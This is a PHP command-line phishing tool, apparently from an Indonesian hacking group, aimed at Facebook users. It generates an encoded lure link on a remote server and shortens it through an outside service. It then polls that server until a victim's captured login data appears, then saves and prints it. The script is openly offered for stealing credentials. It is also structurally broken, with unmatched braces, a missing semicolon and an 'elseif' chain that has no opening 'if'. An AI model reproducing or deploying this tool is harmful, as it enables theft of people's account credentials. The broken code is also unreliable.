<?php

/*
              Welcome To My Tools

   Creater By : NextCyberHack
   My Team : Next Cyber Team
   Tools Name : Phising
   Version : 1.0
   Website : officialnct.zone.id  /  nextcyberhack-tutorial.blogspot.com
*/

$version = '1.0';
$random  = rand(123456789, 6);
$file    = 'phising.php';
$url     = 'https://komunitastahajjudberantai.or.id/q/';
error_reporting(0);
}
// mengecek koneksi
echo "\n[+] Mengecek Koneksi Internet.....";
// $cek = get_headers('https://facebook.com');
// if (!preg_match('/200/', $cek[0]))  {

//    echo "\n[+] Koneksi Stabil";
//    echo "\n[+] Happy Enjoyy";
// }else{
//    echo "\n\n[=] Tydack Ada Koneksi Internet :'V \n\n";
//     exit();
// }
function tampil($version)
{
	echo "
[+]=====================================================================[+]	
              Informasi Tools

   Created By : NextCyberHack
   Team : Next Cyber Team
   Website : officialnct.zone.id  /  nextcyberhack-tutorial.blogspot.com
   Version : 1.0
             Pilihan :
========================================================
|||||||||||||||||       01.Phising     |||||||||||||||||
========================================================
|||||||||||||||||       00.exit        |||||||||||||||||
========================================================
[+]=====================================================================[+]

root@nextcyberhack ==> ";
}
function proses($random)
{
         echo "\n\n[+] Created Link\n[+] ID Tracking : $random \n[+]Parameter ==> : ?page=";
}
function short_dom($urls)
{


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://q.sidia.id/z.php');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "url=$urls");
    $x = curl_exec($ch);
    echo $x;

}
function buat_link($input, $random, $url, $id, $img)
{
      $imgs = base64_encode($img);
      $random2 = base64_encode($random);
      $urls = $url. 'home.php?redirect=' .$input. '&page=' .$random2.'&id=' .$id. '&img=' .$imgs;

      $domen_asli = base64_encode($urls);

      $url = 'Copy Link ==>';
      echo "\n\n[+] $url";
      short_dom($domen_asli)

}
// phising
function buat_phising($opsi, $random, $url)
{

	sleep(1);
	$urls = base64_encode($url. "welcome.php?opsi=" .base64_encode($opsi). "&q=".$random);
	echo "\n[+] Link Ready : > ";
	short_dom($urls);
	// listening
	echo "\n\n[+] Listening Target < ";
	$a = 1;$z=1;
	for ($a; $a < 9999; $a++)   {

		$cek = get_headers($url. "phising/phising_".$random.".txt");
		// listenaing :V
		if (!preg_match("/200/", $cek[0])) {
			echo "=";

		}else{
			$ambil= file_get_contents($url."phising/phising_".$random.".txt");

			preg_match_all("/END/", $file, $o);
			$q = count($o[0]);
			$r = $q + 1;
			echo " >\n[+] Mendapatkan Target !!\n";
			echo "[+] Membuat File ....\n\n";
			$filesss = "phising_".$random.".txt";

			$o = fopen($filesss, 'a');
			fwrite($o, $ambil);
			fclose($o);
			echo $ambil."\n";
			exit();
		}
	}
	sleep(3);
}
}
}elseif($pilih == '1' || $pilih == '01'){
	
	echo "\n [1]. Facebook \n";
	echo "\n\n Masukkan Pilihan : > ";
	$opsi = trim(fgets(STDIN));
	if ($opsi == 1) {
		// Pesbuk :V
		echo "\n\n[+] Your ID : " . $random . "\n[+] Created Link : Loading ........";
		buat_phising($opsi, $random, $url);

	}
}elseif($pilih == '0' || $pilih == '00'){
	exit();

}else{
	echo "\n\n[=] Error Code : '(\n\n";
	exit();
}

?>